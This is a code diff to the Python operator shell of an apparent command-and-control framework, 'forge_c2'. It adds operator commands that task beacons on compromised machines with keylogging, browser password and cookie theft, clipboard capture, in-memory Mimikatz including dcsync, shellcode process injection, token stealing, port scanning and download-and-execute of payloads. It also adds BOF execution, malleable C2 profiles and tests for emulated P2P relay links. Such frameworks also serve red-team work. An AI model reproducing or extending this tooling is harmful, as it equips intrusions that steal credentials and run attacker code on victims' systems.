@@ -481,11 +481,18 @@ class OperatorShell:
             "shell":            self._cmd_shell,
             "exec":             self._cmd_shell,
             "run":              self._cmd_shell,
+            "bof":              self._cmd_bof,
+            "bofs":             self._cmd_bofs,
+            "profiles":         self._cmd_profiles,
             "download":         self._cmd_download,
             "upload":           self._cmd_upload,
             "screenshot":       self._cmd_screenshot,
             "hashdump":         self._cmd_hashdump,
             "socks":            self._cmd_socks,
+            "link":             self._cmd_link,
+            "unlink":           self._cmd_unlink,
+            "p2p_tree":         self._cmd_p2p_tree,
+            "relay_tree":       self._cmd_p2p_tree,
             "sleep":            self._cmd_sleep,
             "kill":             self._cmd_kill,
             "info":             self._cmd_info,
@@ -506,6 +513,35 @@ class OperatorShell:
             "taskall":          self._cmd_task_all,
             "add_operator":     self._cmd_add_operator,
             "addop":            self._cmd_add_operator,
+            # ── Sprint 3: C2 Task Expansion ────────────────────
+            "execute_assembly": self._cmd_execute_assembly,
+            "execute-assembly": self._cmd_execute_assembly,
+            "assembly":         self._cmd_execute_assembly,
+            "keylogger":        self._cmd_keylogger,
+            "keylog":           self._cmd_keylogger,
+            "browser_creds":    self._cmd_browser_creds,
+            "browsercreds":     self._cmd_browser_creds,
+            "creds":            self._cmd_browser_creds,
+            "clipboard":        self._cmd_clipboard,
+            "clip":             self._cmd_clipboard,
+            "mimikatz":         self._cmd_mimikatz,
+            "mimi":             self._cmd_mimikatz,
+            "logonpasswords":   self._cmd_mimikatz,
+            "registry":         self._cmd_registry,
+            "reg":              self._cmd_registry,
+            "service":          self._cmd_service,
+            "sc":               self._cmd_service,
+            "wmi":              self._cmd_wmi,
+            "inject":           self._cmd_inject,
+            "shinject":         self._cmd_inject,
+            "token":            self._cmd_token,
+            "steal_token":      self._cmd_token,
+            "rev2self":         self._cmd_rev2self,
+            "make_token":       self._cmd_make_token,
+            "portscan":         self._cmd_portscan,
+            "scan":             self._cmd_portscan,
+            "download_exec":    self._cmd_download_exec,
+            "dlexec":           self._cmd_download_exec,
             "clear":            self._cmd_clear,
             "cls":              self._cmd_clear,
             "exit":             self._cmd_exit,
@@ -539,17 +575,25 @@ class OperatorShell:
             ],
             "Beacon Tasks (requires interact)": [
                 ("shell <cmd>",           "Execute shell command on target"),
+                ("bof <name|path> [args]","Run BOF (whoami/ps/netstat/ls/...)"),
+                ("bofs",                  "List all available BOFs"),
                 ("download <path>",       "Download file from target"),
                 ("upload <local> <remote>","Upload file to target"),
                 ("screenshot",            "Capture target screenshot"),
                 ("hashdump",              "Dump password hashes"),
                 ("socks <port>",          "Start SOCKS proxy through beacon"),
             ],
+            "P2P Emulation": [
+                ("link <parent> <child> [tcp|smb_named_pipe]", "Record emulated relay link"),
+                ("unlink <child>",        "Remove emulated relay link"),
+                ("p2p_tree",              "Show emulated relay tree"),
+            ],
             "Listeners (admin)": [
                 ("listeners",             "List all listeners"),
                 ("listener_create",       "Create a new listener (interactive)"),
                 ("listener_start <id>",   "Start a listener"),
                 ("listener_stop <id>",    "Stop a listener"),
+                ("profiles",              "List available malleable C2 profiles"),
             ],
             "Server": [
                 ("status, server",        "Show team server status"),
@@ -745,6 +789,130 @@ class OperatorShell:
         })
         self._print_task_result(resp, f"shell: {cmd_str}")
 
+    async def _cmd_bof(self, args: list[str]) -> None:
+        """Execute a BOF (Beacon Object File).
+
+        Usage:
+            bof whoami              — run built-in whoami BOF
+            bof ls /tmp             — run built-in ls with args
+            bof /path/to/custom.o   — run custom COFF BOF
+        """
+        if not args:
+            self._print_error("Usage: bof <name|path.o> [args...]")
+            self._print_info("Run 'bofs' to list available built-in BOFs.")
+            return
+
+        bof_name = args[0]
+        bof_args = args[1:]
+
+        # If we have an active beacon, send as a task
+        if self._active_beacon:
+            resp = await self.transport.send({
+                "cmd": "task",
+                "beacon_id": self._active_beacon,
+                "task_cmd": "bof",
+                "args": {"bof_name": bof_name, "args": bof_args},
+            })
+            self._print_task_result(resp, f"bof: {bof_name}")
+        else:
+            # No beacon — run locally (useful for testing)
+            self._print_info(f"No active beacon — running BOF locally: {bof_name}")
+            try:
+                from forge_c2.bof.builtins import run_builtin_bof, BUILTIN_BOFS
+                if bof_name in BUILTIN_BOFS:
+                    exit_code, output = run_builtin_bof(bof_name, bof_args)
+                    if exit_code == 0:
+                        print(output)
+                    else:
+                        self._print_error(f"BOF exited with code {exit_code}")
+                        print(output)
+                else:
+                    # Try as COFF file
+                    from forge_c2.bof.bof_loader import BOFLoader
+                    from forge_c2.bof.bof_api import BeaconAPI, BeaconDataPacker
+                    from pathlib import Path
+
+                    if Path(bof_name).exists():
+                        api = BeaconAPI()
+                        result = BOFLoader.from_file(bof_name, beacon_api=api)
+                        if result.success:
+                            self._print_success(f"BOF executed in {result.execution_time:.3f}s")
+                            if result.output:
+                                print(result.output)
+                        else:
+                            self._print_error(f"BOF failed: {result.error}")
+                    else:
+                        available = ", ".join(BUILTIN_BOFS.keys())
+                        self._print_error(
+                            f"Unknown BOF: {bof_name}\n"
+                            f"  Available built-ins: {available}\n"
+                            f"  Or provide path to a .o COFF file."
+                        )
+            except Exception as e:
+                self._print_error(f"BOF error: {e}")
+
+    async def _cmd_bofs(self, args: list[str]) -> None:
+        """List all available BOFs (built-in and custom)."""
+        from forge_c2.bof.builtins import list_builtin_bofs
+
+        bofs = list_builtin_bofs()
+
+        print()
+        print(f"  {C.BOLD}{C.ACCENT}═══ Available BOFs ═══{C.RESET}")
+        print()
+        print(f"  {C.HEADER}{C.BOLD}{'NAME':<14} {'DESCRIPTION'}{C.RESET}")
+        print(f"  {C.DIM}{'─' * 60}{C.RESET}")
+
+        for bof in bofs:
+            print(f"  {C.GREEN}{bof['name']:<14}{C.RESET} {C.DIM}{bof['description']}{C.RESET}")
+
+        print()
+        print(f"  {C.INFO}Usage: bof <name> [args]  |  bof <path.o> [args]{C.RESET}")
+        print()
+
+    async def _cmd_profiles(self, args: list[str]) -> None:
+        """List available malleable C2 profiles."""
+        from forge_c2.profiles.profile_parser import list_profiles, get_builtin_profile
+
+        profiles = list_profiles()
+
+        print()
+        print(f"  {C.BOLD}{C.ACCENT}═══ Malleable C2 Profiles ═══{C.RESET}")
+        print()
+        print(f"  {C.HEADER}{C.BOLD}{'NAME':<16} {'SOURCE':<12} {'DESCRIPTION'}{C.RESET}")
+        print(f"  {C.DIM}{'─' * 70}{C.RESET}")
+
+        for p in profiles:
+            name_color = C.GREEN if p["source"] == "built-in" else C.CYAN
+            desc = p["description"][:50] + "..." if len(p["description"]) > 50 else p["description"]
+            print(
+                f"  {name_color}{p['name']:<16}{C.RESET}"
+                f"{C.DIM}{p['source']:<12}{C.RESET}"
+                f"{desc}"
+            )
+
+        print()
+
+        # Show detail if a profile name is given
+        if args:
+            try:
+                profile = get_builtin_profile(args[0])
+                print(f"  {C.BOLD}Profile: {profile.name}{C.RESET}")
+                print(f"  {C.DIM}Description: {profile.description}{C.RESET}")
+                print(f"  HTTP GET URIs: {', '.join(profile.http_get.uri)}")
+                print(f"  HTTP POST URIs: {', '.join(profile.http_post.uri)}")
+                print(f"  Sleep: {profile.beacon.sleep}s  Jitter: {profile.beacon.jitter}%")
+                print(f"  User-Agents: {len(profile.beacon.user_agents)}")
+                if profile.ssl.cert_cn:
+                    print(f"  SSL CN: {profile.ssl.cert_cn} ({profile.ssl.cert_org})")
+                print()
+            except ValueError as e:
+                self._print_error(str(e))
+
+        print(f"  {C.INFO}Usage: listener_create → select profile{C.RESET}")
+        print(f"  {C.INFO}CLI: forge.py c2 start --profile <name>{C.RESET}")
+        print()
+
     async def _cmd_download(self, args: list[str]) -> None:
         """Download file from target."""
         bid = self._require_beacon()
@@ -828,6 +996,72 @@ class OperatorShell:
             "args": {"port": port},
         })
         self._print_task_result(resp, f"socks :{port}")
+
+    async def _cmd_link(self, args: list[str]) -> None:
+        """Record an emulated P2P relay link."""
+        if len(args) < 2:
+            self._print_error("Usage: link <parent_beacon> <child_beacon> [tcp|smb_named_pipe]")
+            return
+        parent = self._match_beacon_id(args[0]) or args[0]
+        child = self._match_beacon_id(args[1]) or args[1]
+        transport = args[2] if len(args) > 2 else "tcp"
+        resp = await self.transport.send({
+            "cmd": "p2p_link",
+            "parent": parent,
+            "child": child,
+            "transport": transport,
+        })
+        if resp.get("status") != "ok":
+            self._print_error(resp.get("message", "P2P link emulation failed"))
+            return
+        data = resp.get("data", {})
+        self._print_success(
+            f"Emulated relay link recorded: {data.get('parent')} -> "
+            f"{data.get('child')} ({data.get('transport')})"
+        )
+        self._print_info("No peer listener, named pipe, or relay socket was started.")
+
+    async def _cmd_unlink(self, args: list[str]) -> None:
+        """Remove an emulated P2P relay link."""
+        if not args:
+            self._print_error("Usage: unlink <child_beacon>")
+            return
+        child = self._match_beacon_id(args[0]) or args[0]
+        resp = await self.transport.send({"cmd": "p2p_unlink", "child": child})
+        if resp.get("status") != "ok":
+            self._print_error(resp.get("message", "P2P unlink emulation failed"))
+            return
+        data = resp.get("data", {})
+        self._print_success(f"Emulated relay link removed for {data.get('child')}")
+
+    async def _cmd_p2p_tree(self, args: list[str]) -> None:
+        """Show emulated P2P relay topology."""
+        resp = await self.transport.send({"cmd": "p2p_tree"})
+        if resp.get("status") != "ok":
+            self._print_error(resp.get("message", "Failed to load P2P tree"))
+            return
+        data = resp.get("data", {})
+        nodes = data.get("nodes", [])
+        print()
+        print(f"  {C.BOLD}{C.ACCENT}=== Emulated P2P Relay Tree ==={C.RESET}")
+        print()
+        if not nodes:
+            self._print_warning("No beacons registered.")
+            return
+        if not data.get("links"):
+            self._print_info("No emulated relay links recorded.")
+        for node in nodes:
+            parent = node.get("parent") or "root"
+            children = ", ".join(node.get("children", [])) or "-"
+            print(
+                f"  {C.BEACON_ID}{node.get('id', ''):<10}{C.RESET} "
+                f"{node.get('hostname', ''):<18} "
+                f"{C.DIM}parent={parent} children={children} "
+                f"transport={node.get('transport', '')}{C.RESET}"
+            )
+        print()
+        print(f"  {C.DIM}{data.get('safety', 'control-plane emulation only')}{C.RESET}")
+        print()
 
     async def _cmd_sleep(self, args: list[str]) -> None:
         """Set beacon sleep interval."""
@@ -1287,6 +1521,460 @@ class OperatorShell:
         else:
             self._print_error(resp.get("message", "Failed"))
 
+    # ══════════════════════════════════════════════════════════════
+    #  SPRINT 3: C2 TASK EXPANSION COMMANDS
+    # ══════════════════════════════════════════════════════════════
+
+    async def _cmd_execute_assembly(self, args: list[str]) -> None:
+        """Execute a .NET assembly in-memory (execute-assembly).
+
+        Usage:
+            execute-assembly <path> [args...]
+            execute-assembly Seatbelt.exe -group=all -full
+            execute-assembly Rubeus.exe kerberoast
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+        if not args:
+            self._print_error("Usage: execute-assembly <path|b64> [args...]")
+            return
+
+        path = args[0]
+        asm_args = args[1:]
+
+        self._print_info(f"⚙ execute-assembly: {path} {' '.join(asm_args)}")
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "execute_assembly",
+            "args": {"path": path, "arguments": asm_args},
+        })
+        self._print_task_result(resp, f"execute-assembly: {path}")
+
+    async def _cmd_keylogger(self, args: list[str]) -> None:
+        """Keyboard capture — start/stop/dump.
+
+        Usage:
+            keylogger start [duration_seconds]
+            keylogger stop
+            keylogger dump
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+
+        action = args[0] if args else "start"
+        duration = int(args[1]) if len(args) > 1 else 600
+
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "keylogger",
+            "args": {"action": action, "duration": duration},
+        })
+        self._print_task_result(resp, f"keylogger {action}")
+
+    async def _cmd_browser_creds(self, args: list[str]) -> None:
+        """Extract saved browser passwords and cookies.
+
+        Usage:
+            creds                    — extract all
+            creds chrome             — Chrome only
+            creds firefox passwords  — Firefox passwords only
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+
+        browsers = [args[0]] if args else ["all"]
+        extract = args[1] if len(args) > 1 else "all"
+
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "browser_creds",
+            "args": {"browsers": browsers, "extract": extract},
+        })
+        self._print_task_result(resp, "browser_creds")
+
+    async def _cmd_clipboard(self, args: list[str]) -> None:
+        """Clipboard monitoring — start/stop/dump.
+
+        Usage:
+            clipboard start [interval_seconds]
+            clipboard stop
+            clipboard dump
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+
+        action = args[0] if args else "start"
+        interval = float(args[1]) if len(args) > 1 else 2.0
+
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "clipboard",
+            "args": {"action": action, "interval": interval},
+        })
+        self._print_task_result(resp, f"clipboard {action}")
+
+    async def _cmd_mimikatz(self, args: list[str]) -> None:
+        """In-memory Mimikatz execution.
+
+        Usage:
+            mimikatz logonpasswords
+            mimikatz sam
+            mimikatz dcsync DOMAIN\\user
+            mimikatz tickets
+            mimi wdigest
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+
+        command = args[0] if args else "logonpasswords"
+        target = args[1] if len(args) > 1 else ""
+
+        self._print_info(f"⚠ CRITICAL: Mimikatz {command} — confirm in beacon")
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "mimikatz",
+            "args": {"command": command, "target": target},
+        })
+        self._print_task_result(resp, f"mimikatz {command}")
+
+    async def _cmd_registry(self, args: list[str]) -> None:
+        """Windows registry operations.
+
+        Usage:
+            reg query HKLM\\SOFTWARE\\Microsoft
+            reg read HKLM\\SOFTWARE\\Microsoft ValueName
+            reg write HKLM\\SOFTWARE\\Test Name Data REG_SZ
+            reg delete HKLM\\SOFTWARE\\Test Name
+            reg search HKLM\\SOFTWARE pattern
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+        if not args:
+            self._print_error("Usage: reg <query|read|write|delete|search> <key_path> [args]")
+            return
+
+        operation = args[0]
+        key_path = args[1] if len(args) > 1 else ""
+        task_args: dict[str, Any] = {"operation": operation, "key_path": key_path}
+
+        if operation == "read" and len(args) > 2:
+            task_args["value_name"] = args[2]
+        elif operation == "write" and len(args) > 3:
+            task_args["value_name"] = args[2]
+            task_args["value_data"] = args[3]
+            if len(args) > 4:
+                task_args["value_type"] = args[4]
+        elif operation == "delete" and len(args) > 2:
+            task_args["value_name"] = args[2]
+        elif operation == "search" and len(args) > 2:
+            task_args["search_pattern"] = args[2]
+
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "registry",
+            "args": task_args,
+        })
+        self._print_task_result(resp, f"registry {operation}")
+
+    async def _cmd_service(self, args: list[str]) -> None:
+        """Windows service management.
+
+        Usage:
+            sc query [service_name]
+            sc create ServiceName DisplayName C:\\path\\binary.exe
+            sc start ServiceName
+            sc stop ServiceName
+            sc delete ServiceName
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+        if not args:
+            self._print_error("Usage: sc <query|create|start|stop|delete> [service_name] [args]")
+            return
+
+        operation = args[0]
+        service_name = args[1] if len(args) > 1 else ""
+        task_args: dict[str, Any] = {
+            "operation": operation,
+            "service_name": service_name,
+        }
+
+        if operation == "create" and len(args) > 3:
+            task_args["display_name"] = args[2]
+            task_args["binary_path"] = args[3]
+
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "service",
+            "args": task_args,
+        })
+        self._print_task_result(resp, f"service {operation}")
+
+    async def _cmd_wmi(self, args: list[str]) -> None:
+        """WMI query and execution.
+
+        Usage:
+            wmi processes                    — query process list
+            wmi services                     — query services
+            wmi users                        — query user accounts
+            wmi "SELECT * FROM Win32_Share"  — custom WQL query
+            wmi exec <command> [target]      — execute via WMI
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+
+        if not args:
+            # Show shortcuts
+            resp = await self.transport.send({
+                "cmd": "task",
+                "beacon_id": bid,
+                "task_cmd": "wmi",
+                "args": {"operation": "query"},
+            })
+            self._print_task_result(resp, "wmi")
+            return
+
+        if args[0] == "exec":
+            command = " ".join(args[1:])
+            resp = await self.transport.send({
+                "cmd": "task",
+                "beacon_id": bid,
+                "task_cmd": "wmi",
+                "args": {"operation": "exec", "command": command},
+            })
+        else:
+            query = " ".join(args)
+            resp = await self.transport.send({
+                "cmd": "task",
+                "beacon_id": bid,
+                "task_cmd": "wmi",
+                "args": {"operation": "query", "query": query},
+            })
+
+        self._print_task_result(resp, f"wmi {args[0]}")
+
+    async def _cmd_inject(self, args: list[str]) -> None:
+        """Process injection — shellcode into target PID.
+
+        Usage:
+            inject <pid> <shellcode_path> [technique]
+            inject 1234 /tmp/payload.bin crt
+            inject 1234 /tmp/payload.bin apc
+            inject --list                    — list techniques
+
+        Techniques: crt, apc, hollow, section, stomp, hijack
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+
+        if not args or args[0] == "--list":
+            resp = await self.transport.send({
+                "cmd": "task",
+                "beacon_id": bid,
+                "task_cmd": "inject",
+                "args": {"list_techniques": True},
+            })
+            self._print_task_result(resp, "inject techniques")
+            return
+
+        if len(args) < 2:
+            self._print_error("Usage: inject <pid> <shellcode_path> [technique]")
+            return
+
+        pid = int(args[0])
+        sc_path = args[1]
+        technique = args[2] if len(args) > 2 else "crt"
+
+        self._print_info(f"⚠ CRITICAL: Injecting into PID {pid} via {technique}")
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "inject",
+            "args": {"pid": pid, "shellcode_path": sc_path, "technique": technique},
+        })
+        self._print_task_result(resp, f"inject PID {pid}")
+
+    async def _cmd_token(self, args: list[str]) -> None:
+        """Token manipulation.
+
+        Usage:
+            token list                — list available tokens
+            token steal <pid>         — steal token from PID
+            token whoami              — show current identity
+            token elevate             — attempt SYSTEM elevation
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+
+        action = args[0] if args else "whoami"
+        task_args: dict[str, Any] = {"action": action}
+
+        if action == "steal" and len(args) > 1:
+            task_args["pid"] = int(args[1])
+
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "token",
+            "args": task_args,
+        })
+        self._print_task_result(resp, f"token {action}")
+
+    async def _cmd_rev2self(self, args: list[str]) -> None:
+        """Revert to original token (shortcut for 'token rev2self')."""
+        bid = self._require_beacon()
+        if not bid:
+            return
+
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "token",
+            "args": {"action": "rev2self"},
+        })
+        self._print_task_result(resp, "rev2self")
+
+    async def _cmd_make_token(self, args: list[str]) -> None:
+        """Create token with credentials (shortcut for 'token make_token').
+
+        Usage:
+            make_token DOMAIN\\user password
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+        if len(args) < 2:
+            self._print_error("Usage: make_token <DOMAIN\\user> <password>")
+            return
+
+        user_spec = args[0]
+        password = args[1]
+        domain = "."
+        username = user_spec
+        if "\\" in user_spec:
+            domain, username = user_spec.split("\\", 1)
+
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "token",
+            "args": {
+                "action": "make_token",
+                "username": username,
+                "password": password,
+                "domain": domain,
+            },
+        })
+        self._print_task_result(resp, f"make_token {domain}\\{username}")
+
+    async def _cmd_portscan(self, args: list[str]) -> None:
+        """Beacon-side TCP port scan.
+
+        Usage:
+            portscan 10.0.0.1 top20
+            portscan 10.0.0.0/24 445,3389
+            portscan 10.0.0.1-10 web
+            scan 192.168.1.0/24 windows
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+        if not args:
+            self._print_error(
+                "Usage: portscan <target> [ports]\n"
+                "  Presets: top20, top100, web, windows, database, smb, rdp"
+            )
+            return
+
+        targets = args[0]
+        ports = args[1] if len(args) > 1 else "top20"
+
+        self._print_info(f"Scanning {targets} ports={ports}...")
+        resp = await self.transport.send({
+            "cmd": "task",
+            "beacon_id": bid,
+            "task_cmd": "portscan",
+            "args": {"targets": targets, "ports": ports},
+        })
+        self._print_task_result(resp, f"portscan {targets}")
+
+    async def _cmd_download_exec(self, args: list[str]) -> None:
+        """Download and execute a file from C2.
+
+        Usage:
+            dlexec <local_file> [args...]
+            download_exec payload.exe --mode memory
+        """
+        bid = self._require_beacon()
+        if not bid:
+            return
+        if not args:
+            self._print_error("Usage: dlexec <file_path> [arguments...]")
+            return
+
+        file_path = args[0]
+        exec_args = args[1:]
+        mode = "direct"
+
+        # Check for --mode flag
+        for i, a in enumerate(exec_args):
+            if a == "--mode" and i + 1 < len(exec_args):
+                mode = exec_args[i + 1]
+                exec_args = exec_args[:i] + exec_args[i + 2:]
+                break
+
+        # Read local file and base64 encode
+        if os.path.exists(file_path):
+            import base64 as _b64
+            with open(file_path, "rb") as f:
+                b64_data = _b64.b64encode(f.read()).decode()
+            resp = await self.transport.send({
+                "cmd": "task",
+                "beacon_id": bid,
+                "task_cmd": "download_exec",
+                "args": {
+                    "data": b64_data,
+                    "filename": os.path.basename(file_path),
+                    "arguments": exec_args,
+                    "mode": mode,
+                },
+            })
+        else:
+            # Assume it's a filename on the C2 server / URL
+            resp = await self.transport.send({
+                "cmd": "task",
+                "beacon_id": bid,
+                "task_cmd": "download_exec",
+                "args": {
+                    "url": file_path,
+                    "arguments": exec_args,
+                    "mode": mode,
+                },
+            })
+
+        self._print_task_result(resp, f"download_exec {file_path}")
+
+    # ══════════════════════════════════════════════════════════════
+    #  GENERAL COMMANDS (continued)
+    # ══════════════════════════════════════════════════════════════
+
     async def _cmd_clear(self, args: list[str]) -> None:
         """Clear the terminal."""
         os.system("cls" if sys.platform == "win32" else "clear")
@@ -1419,9 +2107,11 @@ class OperatorShell:
         """Get all command names (for completion)."""
         return {
             "help": None, "beacons": None, "interact": None,
-            "back": None, "shell": None, "download": None,
+            "back": None, "shell": None, "bof": None, "bofs": None,
+            "profiles": None, "download": None,
             "upload": None, "screenshot": None, "hashdump": None,
-            "socks": None, "sleep": None, "kill": None, "info": None,
+            "socks": None, "link": None, "unlink": None, "p2p_tree": None,
+            "relay_tree": None, "sleep": None, "kill": None, "info": None,
             "note": None, "listeners": None, "listener_create": None,
             "listener_start": None, "listener_stop": None,
             "operators": None, "status": None, "history": None,
@@ -1556,6 +2246,95 @@ class TestColorSupport:
         assert hasattr(C, "GREEN")
         assert hasattr(C, "PROMPT")
         assert hasattr(C, "RESET")
+
+
+class _FakeTransport:
+    def __init__(self) -> None:
+        self.sent: list[dict[str, Any]] = []
+
+    async def send(self, data: dict[str, Any]) -> dict[str, Any]:
+        self.sent.append(data)
+        if data["cmd"] == "p2p_tree":
+            return {
+                "status": "ok",
+                "data": {
+                    "nodes": [
+                        {
+                            "id": "parent1",
+                            "hostname": "parent",
+                            "parent": None,
+                            "children": ["child1"],
+                            "transport": "https",
+                        },
+                        {
+                            "id": "child1",
+                            "hostname": "child",
+                            "parent": "parent1",
+                            "children": [],
+                            "transport": "p2p:tcp:emulated",
+                        },
+                    ],
+                    "links": [{"parent": "parent1", "child": "child1"}],
+                    "safety": "no peer listeners or relay sockets are created",
+                },
+            }
+        if data["cmd"] == "p2p_link":
+            return {
+                "status": "ok",
+                "data": {
+                    "parent": data["parent"],
+                    "child": data["child"],
+                    "transport": data["transport"],
+                },
+            }
+        if data["cmd"] == "p2p_unlink":
+            return {"status": "ok", "data": {"child": data["child"]}}
+        return {"status": "error", "message": "unexpected command"}
+
+
+class TestP2PEmulationCommands:
+    """Unit tests for operator shell P2P emulation commands."""
+
+    def test_handler_map_includes_p2p_commands(self) -> None:
+        shell = OperatorShell()
+        assert shell._get_handler("link") == shell._cmd_link
+        assert shell._get_handler("unlink") == shell._cmd_unlink
+        assert shell._get_handler("p2p_tree") == shell._cmd_p2p_tree
+
+    def test_completion_includes_p2p_commands(self) -> None:
+        shell = OperatorShell()
+        commands = shell._get_handler_map()
+        assert "link" in commands
+        assert "unlink" in commands
+        assert "p2p_tree" in commands
+
+    def test_link_and_unlink_send_emulation_commands(self) -> None:
+        shell = OperatorShell()
+        transport = _FakeTransport()
+        shell.transport = transport
+        shell._beacon_ids = ["parent1", "child1"]
+
+        asyncio.run(shell._cmd_link(["parent", "child", "smb_named_pipe"]))
+        asyncio.run(shell._cmd_unlink(["child"]))
+
+        assert transport.sent == [
+            {
+                "cmd": "p2p_link",
+                "parent": "parent1",
+                "child": "child1",
+                "transport": "smb_named_pipe",
+            },
+            {"cmd": "p2p_unlink", "child": "child1"},
+        ]
+
+    def test_p2p_tree_reads_emulated_topology(self) -> None:
+        shell = OperatorShell()
+        transport = _FakeTransport()
+        shell.transport = transport
+
+        asyncio.run(shell._cmd_p2p_tree([]))
+
+        assert transport.sent == [{"cmd": "p2p_tree"}]
 
 
 if __name__ == "__main__":
